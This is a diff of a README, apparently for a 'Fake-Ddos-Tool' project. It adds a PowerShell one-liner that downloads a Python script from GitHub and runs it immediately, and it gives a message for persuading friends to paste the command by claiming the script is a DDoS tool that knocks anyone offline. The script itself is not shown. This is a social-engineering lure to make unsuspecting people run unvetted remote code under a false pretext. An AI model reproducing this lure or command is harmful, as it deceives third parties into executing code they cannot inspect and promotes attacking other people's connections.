@@ -8,10 +8,8 @@
 2. ## Tell your friends to paste this:
     # each row one by one in order:
    ```powershell
-   git clone https://github.com/thecho0senone/Fake-Ddos-Tool/blob/main/main.py
-   cd Fake-Ddos-Tool
-   python main.py
-
+   powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/thecho0senone/Fake-Ddos-Tool/main/main.py' -OutFile 'main.py'; python main.py"
+## That's literally all they have to do paste in that command.
 Send this to your friends saying:
 "Bro check this OP DDoS tool I found, it can boot anyone offline super fast 😂 Just do the steps mentioned above"
 Works on any IP + Router Killer mode included.
